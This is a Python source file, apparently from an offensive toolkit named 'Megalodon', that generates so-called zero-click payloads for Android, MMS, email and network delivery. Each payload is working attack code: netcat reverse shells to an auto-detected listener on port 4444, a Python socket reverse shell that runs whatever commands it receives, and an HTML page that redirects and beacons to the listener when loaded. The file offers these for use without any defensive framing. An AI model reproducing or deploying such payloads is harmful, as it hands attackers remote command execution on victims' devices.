import json
import os
import time
from pathlib import Path

class ZeroClickPayloadGenerator:
    
    def __init__(self):
        self.output_dir = Path(__file__).parent.parent.parent / 'payloads' / 'zero_click'
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.target = None
        self.listener_ip = self.get_listener_ip()
        self.listener_port = self.get_listener_port()
    
    def get_listener_ip(self):
        try:
            import socket
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(('8.8.8.8', 1))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return '0.0.0.0'
    
    def get_listener_port(self):
        config_file = Path('config/megalodon.json')
        if config_file.exists():
            with open(config_file, 'r') as f:
                config = json.load(f)
                return config.get('listener', {}).get('port', 4444)
        return 4444
    
    def generate_adb_payload(self):
        """Generate ADB-based zero-click payload"""
        print("[*] Generating ADB zero-click payload...")
        
        # Create shell script that runs on target
        payload_content = f'''#!/system/bin/sh
# Megalodon Zero-Click ADB Payload
# Executes automatically when pushed via ADB

# Set up reverse shell
while true; do
    nc {self.listener_ip} {self.listener_port} -e /system/bin/sh &
    sleep 60
done
'''
        
        output_file = self.output_dir / 'adb_payload.sh'
        with open(output_file, 'w') as f:
            f.write(payload_content)
        
        print(f"[+] ADB payload created: {output_file}")
        
        return {
            'success': True,
            'payload_file': str(output_file),
            'type': 'adb',
            'listener_ip': self.listener_ip,
            'listener_port': self.listener_port,
            'message': 'ADB zero-click payload generated'
        }
    
    def generate_mms_payload(self):
        """Generate MMS-based zero-click payload"""
        print("[*] Generating MMS zero-click payload...")
        
        # This is a template - real MMS exploits are complex
        payload_content = f'''# Megalodon MMS Zero-Click Payload
# This is a template for MMS-based exploitation

import subprocess
import time

def execute():
    # Reverse shell payload
    subprocess.Popen(['nc', '{self.listener_ip}', '{self.listener_port}', '-e', '/system/bin/sh'])

if __name__ == "__main__":
    # Trigger on MMS receive
    time.sleep(2)
    execute()
'''
        
        output_file = self.output_dir / 'mms_payload.py'
        with open(output_file, 'w') as f:
            f.write(payload_content)
        
        print(f"[+] MMS payload created: {output_file}")
        
        return {
            'success': True,
            'payload_file': str(output_file),
            'type': 'mms',
            'listener_ip': self.listener_ip,
            'listener_port': self.listener_port,
            'message': 'MMS zero-click payload generated'
        }
    
    def generate_email_payload(self):
        """Generate Email-based zero-click payload"""
        print("[*] Generating Email zero-click payload...")
        
        html_content = f'''<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="refresh" content="0; url=http://{self.listener_ip}:{self.listener_port}/payload">
    <script>
        // Auto-execute on email load
        var xhr = new XMLHttpRequest();
        xhr.open('GET', 'http://{self.listener_ip}:{self.listener_port}/payload', true);
        xhr.send();
    </script>
</head>
<body>
    <h1>Loading...</h1>
</body>
</html>
'''
        
        output_file = self.output_dir / 'email_payload.html'
        with open(output_file, 'w') as f:
            f.write(html_content)
        
        print(f"[+] Email payload created: {output_file}")
        
        return {
            'success': True,
            'payload_file': str(output_file),
            'type': 'email',
            'listener_ip': self.listener_ip,
            'listener_port': self.listener_port,
            'message': 'Email zero-click payload generated'
        }
    
    def generate_network_payload(self):
        """Generate Network-based zero-click payload"""
        print("[*] Generating Network zero-click payload...")
        
        # Python payload that listens for network trigger
        payload_content = f'''# Megalodon Network Zero-Click Payload
# Listens for network trigger then executes

import socket
import subprocess
import threading

def reverse_shell():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(('{self.listener_ip}', {self.listener_port}))
            s.send(b'[+] Connected to Megalodon\\n')
            
            while True:
                cmd = s.recv(1024).decode()
                if not cmd:
                    break
                result = subprocess.getoutput(cmd)
                s.send(result.encode() + b'\\n')
            s.close()
        except:
            time.sleep(5)

# Network trigger - listens for specific packet
def network_trigger():
    # This would be implemented for specific network exploits
    pass

if __name__ == "__main__":
    thread = threading.Thread(target=reverse_shell, daemon=True)
    thread.start()
'''
        
        output_file = self.output_dir / 'network_payload.py'
        with open(output_file, 'w') as f:
            f.write(payload_content)
        
        print(f"[+] Network payload created: {output_file}")
        
        return {
            'success': True,
            'payload_file': str(output_file),
            'type': 'network',
            'listener_ip': self.listener_ip,
            'listener_port': self.listener_port,
            'message': 'Network zero-click payload generated'
        }
    
    def generate(self, payload_type='adb'):
        """Main generation method"""
        if payload_type == 'adb':
            return self.generate_adb_payload()
        elif payload_type == 'mms':
            return self.generate_mms_payload()
        elif payload_type == 'email':
            return self.generate_email_payload()
        elif payload_type == 'network':
            return self.generate_network_payload()
        else:
            return {'success': False, 'error': f'Unknown payload type: {payload_type}'}

def generate(payload_type='adb'):
    generator = ZeroClickPayloadGenerator()
    return generator.generate(payload_type)
